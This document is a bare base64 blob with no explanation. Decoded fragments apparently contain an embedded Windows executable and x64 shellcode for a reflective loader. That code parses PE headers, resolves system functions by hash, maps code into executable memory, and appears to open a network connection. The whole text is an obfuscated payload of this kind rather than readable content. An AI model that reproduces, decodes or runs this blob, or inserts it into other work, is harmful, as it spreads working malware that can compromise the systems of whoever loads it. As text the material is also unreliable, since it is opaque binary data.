RzZBUUFBQURIMlNZbjdTSW5mU1RuQ1NJdFVKRWdQaFdMLy8vOUJ1Z0VBQUFBeDlyOEJBQUFBUlRIYlRJME1OMGs1MFErRGtRQUFBRW1KK1VuMzBVbUoxa2twOWswQnprazUxZytEaHdJQUFFbUo4VW4zMFVrQjBVMHAyVWs1MFErRGZnSUFBRWlOWHdGSWkxUWtRRWFLREFwR09Bd3lkaEZJalJ3K1NQL0RTWW5hVFNuYU1mYnJMM1VpU1AvR1REbldTSW55UWJrQUFBQUFTUTlFMFVrUFJmRklpZk5JQWZ0SWlkYnJDMEc2QVFBQUFESDJTWW43U0luZlNUbkNTSXRVSkVnUGhXTC8vLzlJaGNCMEYwaUQrQVJJaTN3a2NITWdSVEhTTWRKSWkzUWtRT3RiUlRIYlJUSFNNY0JNaTNRa1NFaUxmQ1J3NjI1SmljRkpnK0g4UlRIU01kSklpM1FrUUVTS0hCWklpM1FrUUVDS2RCWUJUUStyMmtrUHEvSklpM1FrUUVTS1hCWUNUUStyMmtTS1hCWURUUStyMmtpRHdnUkpPZEYxeWtHSndVR0Q0UU4wRmtnQjhrVXgyMEtLTkJwSkQ2dnlTZi9EVFRuWmRmQkZNZHRNaTNRa1NFeUo5a2dweGtpTGxDU1lBQUFBU0FIWE1kdE1PZGxOaWQ1TUQwZnhURG5CVEE5Rjhib0FBQUFBVEE5RjJraUxsQ1NnQUFBQVNBSGFTSVA2QncrSDQvTC8vMHlMVENSUVFRKzJGQkZKRDZQU2N6MUlqUlFmVFluM1REdDhKRWh6TzA2TkREdEpnL2tIRDRlN0FBQUFUSXRrSkVCRGlpdzhUWTFuQVVJNkxEcE5pZWQwMVVrcHlVeUp5MGovdytzRlNBTmNKRWhNT2NGMWxPdE1TSW5LU1RuVGMxOUkvOHBJTzFRa1NBK0RvZ0FBQUV5TkRCcEpnL2tJRDRPZ0FBQUFUSXQ4SkVCQmlpd1hUSXQ4SkZCRE9pd1BkTXRJQWNOTU9jRVBoVTcvLy85SmlmUHBMUC8vLzBVeDIra2svLy8vTWNBeDB1c2dTSXVFSkpnQUFBQklpVVFrVUVpTFJDUlFpMUFJaTBBTVNBT0VKT2dBQUFCSWdjUVlBUUFBVzExZlhrRmNRVjFCWGtGZncweU5CV0RzLy8vck5FeU5CUi90Ly8vckUweU5CUmJ0Ly8vckZreUp3VXlOQmZyci8vOU1pZkxyT0V5TkJRYnMvLzlJaWRIckoweU5CUkxzLy8rNkNBQUFBRXlKeWVzYlRJMEYrZXovLzB5Sjhlc1BUSTBGQmUzLy8weUp5VWlMVkNSSTZNZ05BQUFQQzB5TkJZL3MvLy9yczB5TkJaN3MvLzlJaWNGTWlkTHI0VXlOQlkvcy8vOU1pZEhybUZaSWdleXdBQUFBU0luV1RJbkM2RElBQUFCSWhjQjBJakhKU0lINWlBQUFBSFFLeGtRTUtBQkkvOEhyN1VpTlRDUW9TSWx4TVAvUTZ3SXh3RWlCeExBQUFBQmV3MVpYVTBpRDdIQkloY2tQaE1vQkFBQklpZGRJaWM1SWlkRm11Z29BUlRIQVprRzU3RlhvQ3UzLy80VEFkQTFJaWZIb2J3SUFBT21oQVFBQVNJTmtKRWdBU0lOa0pFQUFTSU5rSkRnQVNJTmtKREFBU0luNVpyb0tBRVV4d0daQnVhcy82TTNzLy85SWlmbG11Z29BUlRIQWhNQjBZMlpCdWJwSDZMWHMvLys3UmdBQUFJVEFkUnRJaWZsbXVnb0FSVEhBWmtHNTdrTG9tT3ovL3crMjJFaUR3ME5JalZRa1VNY0NkRE5FaldiSFFnUkRDVWlOZkNRd1FiZ0dBQUFBU0luNTZCdnMvLzlJaVY4WVNNZEhFQVlBQUFEcGtRQUFBR1pCdWRjNjZGTHMvLytFd0hRdVNJMVVKRkRIQW5RelJJMW14MElFUXdsSWpYd2tNRUc0QmdBQUFFaUorZWpZNi8vL1NNZEhFQVlBQUFEclRVaUorV2E2QmdCbVFiZ0RBRVV4eWVnTTdQLy9oTUFQaExRQUFBQkl1RVNOUXdsTWpVd2tTSTFVSkZCSWlRTEdRZ2c0U0kxOEpEQkJ1QWtBQUFCSWlmbm9pZXYvLzBqSFJ4QUpBQUFBU01kSEdFTUFBQUJJaTN3a1NFaUpmQ1JvU0l0RUpFQklpVVFrWUVpTFJDUXdTSXRNSkRoSWlVd2tXRWlKUkNSUVNJWC9kRVJJaWZIbzNRSUFBRWlKeGpIQVNJWDJkRFJJaGRKMEwweU5SQ1JRU1l0QUVFaUpSQ1FnUWJrUUFBQUFTSW54Nktici8vOUlnL2ovZEF0SUtmNUlBY1pJaWZEckFqSEFTSVBFY0Z0ZlhzTklpZmxtdWdZQVprRzRBZ0JGTWNub1BPdi8vNFRBZERwSXVFaUxlVEJGaldZQlNJMVVKRkJJaVFKSWpYd2tNRUc0Q0FBQUFFaUorZWpCNnYvL1NNZEhFQWdBQUFCSXgwY1lTUUFBQU9rei8vLy9TSW41WnJvR0FHWkJ1QUVBUlRISjZPcnEvLytFd0ErRUYvLy8vekhiZ1QvOFhRQUFENUxEU0xoQnVBa0FBQUJJalVpTlZDUlFTSWtDWnNkQ0NFUWt4a0lLT0VpTmZDUXdRYmdMQUFBQVNJbjU2RmJxLy85SXgwY1FDd0FBQUVpTkJKMGpBQUFBU0lsSEdPbkUvdi8vVmxkVFNJUHNVRWlKemtpNFRHUnljRWx1YVhSSWpWUWtQa2lKQWtpNGFXRnNhWHBsVkd4SWlVSUlac2RDRUhNQVFiZ1NBQUFBNkM0QkFBQklqVlFrTUdiSEFreU54a0lDQlVpSlJDUWdRYmdEQUFBQVFia0hBQUFBU0lueDZKZ0JBQUJJaGNBUGhPSUFBQUJJaWNkSUFmZE1qVVFrTDBIR0FPaEl4MFFrSUFFQUFBQzZNQUFBQUVHNUFRQUFBRWlKK2VnMDZ2Ly9TSVA0L3crRXJRQUFBRWlKdzBpTkREaElnOEVGU01kRUpDQUJBQUFBVEkxRUpDKzZNQUFBQUVHNUFRQUFBT2dCNnYvL1NJUDQvM1IrU0FIN1NJME1HRWlEd1FWSWljSklBZHFMUkJnR2c4QUZTSmhJQWNKSWc4SUZUSTFFSkRCSmlRaEJ1UUVBQUFCSWlmSG9Yd0lBQUVpRndIUkNTSW5IU0lueDZNQUFBQUJJaWNFeHdFaUZ5WFF2U0lYU2RDcElBY3BJT2RkeklqSEFEN2NYZ2ZxUWtBQUFkQjJCK3N6TUFBQjBGVWlEeC81SU9jOTM1T3NDTWNCSWc4UlFXMTlld3pIQWdIOEN6QStVd0VnQitFaUR3QUxyNWtGV1ZsZFRTSVBzT0V5SngwaUowMGlKemtpTlZDUXl4d0l1Y21SaFpzZENCSFJoUWJnR0FBQUE2RG5yLy85SmljWXh3RTJGOW5RclNJWFNkQ1pJaVh3a0lFeUo4VW1KMkVtSitlZ1I2Zi8vU0lQNC8zUUxTUUhHU1NuMlRJbnc2d0l4d0VpRHhEaGJYMTVCWHNOSWcrd29TSTFVSkNQSEFpNTBaWGpHUWdSMFFiZ0ZBQUFBNk56cS8vK1FTSVBFS01OQlYwRldRVlZCVkZaWFZWTklnK3g0VEluT1RJbkRTSWxVSkVoSmljM291Zi8vLzBtSnh6SEFTSVA3REErSEtBRUFBRTJGL3crRUh3RUFBRW1KMUVpRjBnK0VFd0VBQUVpTGhDVGdBQUFBU0lsRUpFQXh3RWlEK0JCMENzWkVCRkFBU1AvQTYvQklqVXdrVUVpTFZDUklTWW5ZNk12bi8vOUlqVHdjU0lQSFVFRytFQUFBQUVrcDNraU5Rd1JJaVVRa2NFeUorRXdCNEVpSlJDUm9USWxzSkdCTUFXd2tRREhBU0lsRUpEaElpVndrSUV5SitVeUo0a3lMUkNSSVNZblo2QXJvLy85SWcvai9ENFNGQUFBQVNJbkZRWTBFTndIb1NJdE1KRUFwd1lsTUpEUXh3RWs1eG5RSnhnUUhBRWovd092eVFiZ0VBQUFBU0luNVNJMVVKRFRvUE9mLy8wMk5MQzlJaTBRa2NFaUpSQ1FndWhBQUFBQkJ1UkFBQUFCTWllbE1qVVFrVU9pajUvLy9TSVA0LzNVWVNBSDFTU25zZGhwSkFlOU1PM3drYUErR1pmLy8vK3NLVEN0c0pHQk1pV3drT0VpTFJDUTRTSVBFZUZ0ZFgxNUJYRUZkUVY1Qlg4TkJWMEZXUVZWQlZGWlhWVk5JZyt3NFRJbk9USW5IU0luVDZGUCsvLzlGTWZaSWhjQVBoSWNBQUFCSmlkUkloZEowZjBtSngwbUp4VWlOYkNRM3hrVUE2RTBCNTBqQjVnTkZNZlpJeDBRa0lBRUFBQUJCdVFFQUFBQk1pZWxNaWVKSmllam8vZWIvLzBpRCtQOTBRMHFORENpSjJpbktSb3RFS0FGQmc4QUZRVG5RZFJReDBrZzUxblFqVEkxQ0NFZzVEQmRNaWNKMTdraU5TQUZKS2N4MkVFa0J4VW4veFUwNS9YYWY2d05KaWM1TWlmQklnOFE0VzExZlhrRmNRVjFCWGtGZncxWklnK3dnU0luTzZBYm0vLzlJaWZCSWc4UWdYc014d0VVeHlVMDV5SFFZUmcrMkZBbEdEN1ljQ2tuL3dVVTQyblRwUlNuYVJJblF3MEZYUVZaQlZVRlVWbGRWVTBpQjdMZ0NBQUJtZ1RsTldnK0ZkQVVBQUVpSnpraGpTVHlCUERGUVJRQUFENFZnQlFBQVNJblRTSW5JU0FId1NJbEVKQ0FQdDNnVXVWV1YyMjFNaVV3a2NFeUpSQ1JvNkJ2bi8vOUppY2E1N2JEYUh1Z081Ly8vU0lsRUpDaE1pWFFrVUUyRjlnK0VHZ1VBQUVpRGZDUW9BQStFRGdVQUFFeUxaQ1JRVEluaHV0c3ZCN2ZvT2VmLy8wbUp4a3lKNGJxL3djL2U2Q25uLy85SmljVk1pZUc2VjhKN0NlZ1o1Ly8vU1luSFRJbmh1ZzFRVitqb0NlZi8vMGlKUkNSSVRJdGtKQ2hNaWVHNmY3aHBZdWp5NXYvL1NJbEVKRUJNaWVHNjNWemVEZWpnNXYvL1RZWDJENFNhQkFBQVRZWHRENFNSQkFBQVRZWC9ENFNJQkFBQVNJTjhKRWdBRDRSOEJBQUFTSU44SkVBQUQ0UndCQUFBU0lYQUQ0Um5CQUFBU0lsRUpHQk1pZjFNaTN3a0lFbUxUekJCaTFkUVFiZ0FNQUFBUWJrRUFBQUEvOVZJaGNCMEVrbUp4RWlKYkNRd1NJbGNKRGhGTWYvck5rR0xWMUF4eVVHNEFEQUFBRUc1QkFBQUFQL1ZTSVhBRDRRUUJBQUFTWW5FU0lsc0pEQklpVndrT0VtSngwaUxSQ1FnVEN0NE1FaUxYQ1FnU0kxREdFaUpSQ1JZU0FIZlNJUEhHRVNMUTFSTWllRklpZkxvRytULy93KzNXd1pJZzhjVVpvUHJBWElhaTAvNFJJdEgvRXdCNFlzWFNBSHk2UG5qLy85SWc4Y282K0JOaGY5MFlVaUxSQ1FnZzdpMEFBQUFBSFJUU0l0RUpDQklqWWl3QUFBQVRJbmdpd21EUEFnQWREeElBY2hJalVnRWkxQUVnOEw0MGVwRk1jQk1PY0owNFVZUHQweEFDRW1CK1FBUUFBQnlFVVNMRUVHQjRmOFBBQUJOQWVGUEFUd0tTZi9BNjlaSWkwUWtJSXU0a0FBQUFFd0I1NHRQREVpRnlYUk5UQUhoUWYvV2l3K0xYeENGeVVHSjMwUVBSZmxJaWNaTkFlZE1BZU14N1VtTEJDOUloY0IwSDNnS1NvMFVJRWlEd2dMckF3KzMwRWlKOFVILzFVaUpCQ3RJZzhVSTY5aElnOGNVNjZ0SWkwUWtJSU80OUFBQUFBQjBYRWlMUkNRZ2k3andBQUFBVEFIbmkwOEVTSVhKZEVaTUFlRkIvOVpJaWNaRWkzOE1pMThRVEFIalRRSG5NZTFJaXdRclNJWEFkQjk0Q2txTkZDQklnOElDNndNUHQ5QklpZkZCLzlWSmlRUXZTSVBGQ092WVNJUEhJT3V5VEl0OEpDQkJEN2RIRkVFUHQzOEdTSXRNSkZoTWpUUUlTWVBHREVpTmRDUjRTSXRjSkVobWcrOEJjbStEWkNSNEFFR0xSaGhCaWNCQmdlQUFBQUJBRDdyZ0hYSUtoY0I0R2tIQjZCM3JONFhBZUNJeHdFV0Z3QStWd01IZ0JJUEFFT3NnTWNCRmhjQVBsTUJFalFTRkJBQUFBT3NSTWNCRmhjQVBsTURCNEFhRHdFQkJpY0JCaXc1TUFlRkJpMVlFU1lueC85TkpnOFlvNjRzeC8wakh3Zi8vLy84eDBrVXh3UDlVSkVCSWpiUWtuQUVBQUVHNEhBRUFBRWlKOFRIUzZJVGovLzlJaWZIL1ZDUmdpMFlFd2VBSUMwWUlQUUVGQUFBUGhKVUFBQUE5QVFZQUFIUi9QUUlHQUFCMGZUMERCZ0FBZEhzOUFBb0FBSFY4aTRRa3FBRUFBRUMzRHozclZRQUFkMnRBdHc0OVlFb0FBSGRoUUxjTlBicEhBQUIzVjBDM0RIUlNRTGNMUFdKRkFBQjNTRUMzQ2ozdFFnQUFkejVBdHdrOXFqOEFBSGMwUUxjSVBkWTZBQUIzS2tDM0J6MDRPQUFBZHlBOVdpa0FBRUMzQlVDQTMvL3JFa0MzQXVzTlFMY0Q2d2hBdHdUckEwQzNBVWlObENTY0FRQUFpMW9NU0kxMEpIeEJ1QndCQUFCSWlmSG9GL3YvLzBDSXZod0JBQUNKWHZ4TWpVUWtlRWlMVENRb1RJbmk2T2Z6Ly85Qmc3L1VBQUFBQUVpTGZDUTRkQ2RCaTRmUUFBQUFTWXQwQkJoSWl3WkloY0IwRTB5SjRib0JBQUFBUlRIQS85QklnOFlJNitWSWkwd2tVTHJPaDZpQjZMN2kvLzlJaGNCMGZFbUp3VUdMaDZRQUFBQ0Z3SFFlUVl1UDBBQUFBRXdCNFVHNERBQUFBREhTUWZmd2pWRC9UWW5nUWYvUlFZdEhLRWtCeERISlNJdGNKSEJJaWRwQnVBQXdBQUJCdVFRQUFBRC9WQ1F3U0luR1NJbkJTSXRVSkdoSmlkam9aT0QvL3pISlNJWC9kQXE2RFFBQUFFbUo4T3NJdWdFQUFBQkZNY0JCLzlTUVNJSEV1QUlBQUZ0ZFgxNUJYRUZkUVY1Qlg4UE16TXpNek16TXpNek16TXpNekVGV1ZsZFZVMFdFeVhRRU1jRHJlRWovd2t5TENVeUxVUkJNaTFrWVNZMXovR1pGaGNBUGxjQjBYVUVQdk1oSWpUd0tUQUhQU1lQN0EzY1pNY0JKT2NOMFE0b2NCMHlOY0FGQk9od0NUSW53ZE92ckpVaU5IRGROaWRaSU9kOXpFWXN2UVRzdWRSSklnOGNFU1lQR0JPdnFpenRCT3p3eWRBNW11UDcvWnRQQVFTSEE2NXl3QVZ0ZFgxNUJYc1BNek92K3pNek16TXpNek16TXpNek16TXhJZyt3bzZPZi8vLzhQQzh3QkJnVUFCakFGVUFSd0EyQUM0QUFBQVFRQkFBUkNBQUFCREFZQURBRUZBUVV3QkhBRFlBTGdBUXNHQUFzeUJ6QUdjQVZnQk9BQzhBRVFDUUFRUWd3d0MxQUtjQWxnQ01BRzBBVGdBdkFBQUFFVENnQVRBU01BRERBTFVBcHdDV0FJd0FiUUJPQUM4QUVJQXdBSUFSWUFBV0FBQUFFSEJBQUgwZ013QW5BQllBRUhCQUFIa2dNd0FuQUJZQUVKQlFBSllnVXdCSEFEWUFMZ0FBQUJFQWtBRU9JTU1BdFFDbkFKWUFqQUJ0QUU0QUx3QUFBQkVBa0FFR0lNTUF0UUNuQUpZQWpBQnRBRTRBTHdBQUFCQlFJQUJUSUJZQUVUQ2dBVEFWY0FEREFMVUFwd0NXQUl3QWJRQk9BQzhBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFUVnFRQUFNQUFBQUVBQUFBLy84QUFMZ0FBQUFBQUFBQVFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQWdBQUFBQTRmdWc0QXRBbk5JYmdCVE0waFZHaHBjeUJ3Y205bmNtRnRJR05oYm01dmRDQmlaU0J5ZFc0Z2FXNGdSRTlUSUcxdlpHVXVEUTBLSkFBQUFBQUFBQUJRUlFBQVpJWUZBQnh2K1djQUFBQUFBQUFBQVBBQUxnSUxBZ0lpQUJBQUFBQUlBQUFBQUFBQUFCQUFBQUFRQUFBQUFFQUFBQUFBQUFBUUFBQUFBZ0FBQkFBQUFBQUFBQUFGQUFJQUFBQUFBQUJnQUFBQUJBQUFEUUlCQUFJQVlBVUFBQ0FBQUFBQUFBQVFBQUFBQUFBQUFBQVFBQUFBQUFBQUVBQUFBQUFBQUFBQUFBQVFBQUFBQUFBQUFBQUFBQUFBVUFBQUZBQUFBQUFBQUFBQUFBQUFBREFBQUF3QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBdWRHVjRkQUFBQURnT0FBQUFFQUFBQUJBQUFBQUVBQUFBQUFBQUFBQUFBQUFBQUFBZ0FGQmdMbkprWVhSaEFBQThBQUFBQUNBQUFBQUNBQUFBRkFBQUFBQUFBQUFBQUFBQUFBQUFRQUJRUUM1d1pHRjBZUUFBREFBQUFBQXdBQUFBQWdBQUFCWUFBQUFBQUFBQUFBQUFBQUFBQUVBQU1FQXVlR1JoZEdFQUFCZ0FBQUFBUUFBQUFBSUFBQUFZQUFBQUFBQUFBQUFBQUFBQUFBQkFBREJBTG1sa1lYUmhBQUFVQUFBQUFGQUFBQUFDQUFBQUdnQUFBQUFBQUFBQUFBQUFBQUFBUUFBd3dBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFGWklpZVpJZytUd1NJUHNJT2diQUFBQVNJbjBYc01QQzRnUlJJbEpBWXRFSkNpSlFRVkVpRUVKd3c4TFFWZEJWa0ZWUVZSV1YxVlRTSVBzV0VpTlRDUkdRYmdLQUFBQU1kTG9xd3NBQUVpTkRhOFBBQUJJalJXekR3QUFaa0c0aWhQb09nTUFBRWlGd0ErRXRRRUFBRWlKeHNkRUpDQU1BQUFBU0kxOEpFWklpZm15UVVHd1FrRzVKdERqQStpRy8vLy9USTE4SkZCSmd5Y0FUSWw4SkRCTWpTV0ZEd0FBVElsa0pDQkl4MFFrS0JBQUFBQk1qUVZnRHdBQXVnb0FBQUJCdVJBQUFBQklpZm5vaEFrQUFFRzRDZ0FBQUVpSjhVaUordWdGQlFBQVNJWEFENFE3QVFBQU1kdEJ1QW9BQUFCSWlma3gwdWorQ2dBQVNJUDdDWE1vU0kwVU8wRzRDUUFBQUVrcDJFaUo4ZWhoQkFBQWpVZ0JnL2tDRDRJQ0FRQUFpY0JJQWNQcjBnK0Y5UUFBQUVpRFpDUlFBRXlKZkNRd1RJbGtKQ0JJeDBRa0tCQUFBQUJNalFYTkRnQUFTSTE4SkVhNkNRQUFBRUc1RUFBQUFFaUorZWpzQ0FBQWdEOUJENFcwQUFBQVNJMU1KRWZveVFvQUFJbkhTSTFNSkV2b3ZRb0FBSUgvSnREakF3K0ZrZ0FBQUluRGhjQVBoSWdBQUFDSjMwaU5Wd0ZGTWUweHlVRzRBQkFBQUVHNUJBQUFBT2pWQ1FBQVNJWEFkR2RKaWNhTmF3RkVpZXBNQWZKQmllaElpZkhvb3dNQUFJWEFkRXhDalF3by84azV5M1FNUVFIRktjVkJPZDEyMStzMlRJbDhKREJNaVdRa0lFakhSQ1FvRUFBQUFFeU5CUlFPQUFCQnVSQUFBQUJNaWZGSWlmcm9PZ2dBQUV5SjhVaUordWdnQmdBQWtFaUR4RmhiWFY5ZVFWeEJYVUZlUVYvRHVBRUFBQUREWlVpTEJDVmdBQUFBd3c4TFFWTlhTREgvU01mSEJSVUFBRWdQdHdGSWhjQjBJMGlEK0VGOENraUQrRnAvQkVpRHdDQkppZnRJd2VjRlRBSGZTQUhIU0lQQkF1dlVpZmhmUVZ2RER3dEJVMWRJTWY5SXg4Y0ZGUUFBU0ErMkFVaUZ3SFFqU0lQNFFYd0tTSVA0V244RVNJUEFJRW1KKzBqQjV3Vk1BZDlJQWNkSWc4RUI2OVNKK0Y5Qlc4TVBDMVpSUVZKQlUxZm9adi8vLzBpTGVCaElpMzhnVEl0WENFaUxCNG5PVEl0WVVFMkYyM1FlVUV5SjJlaFAvLy8vT2ZCWWRBcE1PZEIwQzBpTEFPdmZTSXRBSU9zRFNESEFYMEZiUVZwWlhzTVBDMVpCVWtGVFVVRlFRVkZJaGNsMFpraUp6b3RHUEVnQjhJdUFpQUFBQUlYQWRGTklBZkJFaTFnWVJJdFFJRWtCOGtTTFNDUkpBZkZFaTBBY1NRSHdTREhKUkRuWmZTOUJpd1NLU0FId1VVaUp3VUZUNkJiLy8vOUJXMWs1MEhRRlNQL0I2OTFJTWNCbVFZc0VTVUdMQklCSUFmRHJBMGd4d0VGWlFWaFpRVnRCV2w3RER3dFZVMVpYUVZSQlYwaUI3Q0FDQUFCSWcrd1FTSVBzR0VpRDdEQk1qU1FrU0lYSkQ0UnpBUUFBU0lYU0Q0UnFBUUFBVFlYQUQ0UmhBUUFBU1lsTUpEQkppVlFrT0UySlJDUkFTTWZCZGU1QWNPalYvdi8vU0lYQUQ0UTlBUUFBU0luQlNNZkNXemxtQnVnTy8vLy9TSVhBRDRRbEFRQUFTWXRNSkRELzBFaUZ3QStFRlFFQUFFaUp4MGlKK1VpNkF6K0xtUUFBQUFEbzRQNy8vMGlGd0ErRTl3QUFBRWpId1FJQ0FBQkpqVlFrWVAvUWhjQVBoZUVBQUFCSWlmbEl4OEl1QXpFYzZMTCsvLzlJaGNBUGhNa0FBQUJJeDhFQ0FBQUFTTWZDQVFBQUFFMHh3UC9RUGYvL0FBQVBoS3NBQUFCSWljWklpZmxJdWkrOXJyRUFBQUFBNkhiKy8vOUloY0FQaEkwQUFBQkppMHdrT1AvUVFZbEVKRXhJaWZsSXg4SlJkNW9QNkZMKy8vOUloY0FQaElJQUFBQkppMHdrUVAvUVpzZEVKRWdDQUdhSlJDUktTTWRFSkZBQUFBQUFTSW41U0xyUFRYYlRBQUFBQU9nYi92Ly9TSVhBZEU5SWlmRkpqVlFrU0VuSHdCQUFBQUQvMElQNC8zUUZTSW53NnpsSWlmbEl4OElFc1V4SjZPejkvLzlJaGNCMElFaUo4Zi9RNnhsSWlmbEl1dmdqZmJjQUFBQUE2TTc5Ly85SWhjQjBBdi9RdUFFQUFBQklnOFF3U0lQRUdFaUR4QkJJZ2NRZ0FnQUFRVjlCWEY5ZVcxM0REd3RWVTFkV1NJUHNJRWlEN0JCSWpUd2tTSVhKZEVkSWlWY1FTSWxQR0V5SlJ5Qkl1UThMMFpvQUFBQUE2Q1A5Ly85SWhjQjBKMGlKd1VqSHdwVk5uWHpvWVAzLy8waUZ3SFFUU0l0UEdFaUxWeEJNaTBjZ1RUSEovOURyQTBneHdFaUR4QkJJZzhRZ1hsOWJYY01QQzFkV1NJUHNJRWlEN0JCSWpUd2tTSVhKZEV4SWhkSjBSMGlKVnhCSWlVOFlUSWxISUVpNUR3dlJtZ0FBQUFEb3N2ei8vMGlGd0hRblNJbkJTTWZDVDl1ZGZPanYvUC8vU0lYQWRCTklpMDhZU0l0WEVFeUxSeUJOTWNuLzBPc0RTREhBU0lQRUVFaUR4Q0JlWDhNUEMxVlRWMVpJZyt3Z1NJUHNFRWlOUENTSVZ4Qk1pVThSeDBjVkFBQUFBRXlKUnhsSWlVOGFTTGtQQzlHYUFBQUFBT2hCL1AvL1NJWEFkRHhJaWNGSXg4SlAyNTE4Nkg3OC8vOUloY0IwS0VpTFR4cElqVmNRU2NmQUFBQUFBRW5Id1JBQUFBQk5NY2hOTWNGTk1jai8wRWlGd0hRQzZ3TklNY0JJZzhRUVNJUEVJRjVmVzEzRER3dFZVMWRXU0lQc0lFaUQ3Q0JJZyt3UVNJMDhKRWlGeVErRUlRRUFBRWlKVnhCTWlVY1lTSWxQSUV5SlR5aEl1UThMMFpvQUFBQUE2TEw3Ly85SWhjQVBoUGtBQUFCSWljRkl4OEtWVFoxODZPdjcvLzlJaGNBUGhPRUFBQUJJaVVkQVNJdFBJRWlOVnpCSng4QUpBQUFBVFRISi85Q0Z3QStFd1FBQUFJUDRDUStGdUFBQUFFakh4akFBQUFDS0JEZUtYeEE0MkErRm93QUFBRWoveG90UEtEc01OdytGbEFBQUFFaUR4Z1JFaXdRM1RZWEFENFNEQUFBQVNmL0FUSWtFTjBqSHdYWHVRSERvSVB2Ly8waUZ3SFJyU0luQlNNZkMxOHZhV09oZCsvLy9TSVhBZEZkSU1jbUxGRGRKeDhBRUFBQUFTY2ZCQUJBQUFFMHh5RTB4d1UweHlQL1FTSVhBZEROSWljTklpVWRJaXpRM1NJdFBJRWlKMmttSjhFMHh5ZjlYUUVpRndIUVVTWW5BU0l0SFNFazU4SFFOVENuR1RBSEQ2OWRJTWRqckVraUxWelZJS2ROSS84TklpZG5vRXdBQUFFaUR4QkJJZzhRZ1NJUEVJRjVmVzEzRER3dFZVMWRXU0lQc01FaUQ3Q0JJZyt3Z1NJMThKRUJJaVE5SWlWY0lTTWZCZGU1QWNPaGUrdi8vU0lYQUQ0UmJBUUFBU0luR1NJbnhTTHFSdEJub0FBQUFBT2lSK3YvL1NJWEFENFE5QVFBQVNESEpTREhTVEkwRlJnRUFBRW5Id1FBQUFBQkl4MGZnQUFBQUFFakhSK2dBQUFBQS85QklpVWNRU0lYQUQ0UUtBUUFBU0lueFNMcjhzUkxHQUFBQUFPaEQrdi8vU0lYQUQ0VFRBQUFBU0RISlNESFNUVEhBVFRISi85QkloY0FQaEx3QUFBQklpVWNZU0lueFNMck52WjZMQUFBQUFPZ04rdi8vU0lYQUQ0U2RBQUFBU0lzUFNJdFhDRW5Id0VBQUFBQk1qVThvLzlCSXg4SHR0ZE1pNkpQNS8vOUloY0IwZUVpSndVaTZOZUpzN2dBQUFBRG96Zm4vLzBpRndIUmhTSXRQRUVneDBreUxCMHlMVHhoSXgwZmdBQUFBQUVqSFIrZ0FBQUFBLzlCSWlmRkl1cTdxSnQwQUFBQUE2SmI1Ly85SWhjQjBLa2lMVHhELzBFaUo4VWk2T3VJWTJnQUFBQURvZWZuLy8waUZ3SFFOU0l0UEVFakh3di8vLy8vLzBFaUo4VWpId2tlR3JDN29XUG4vLzBpRndIUUlTSXRQRVAvUTZ3TklNY0JJZzhRZ1NJUEVJRWlEeERCZVgxdGR3dzhMVlZOWFZraUQ3Q0JJaWM1SXg4RjE3a0J3Nk0zNC8vOUloY0IwUmtpSngwaUp3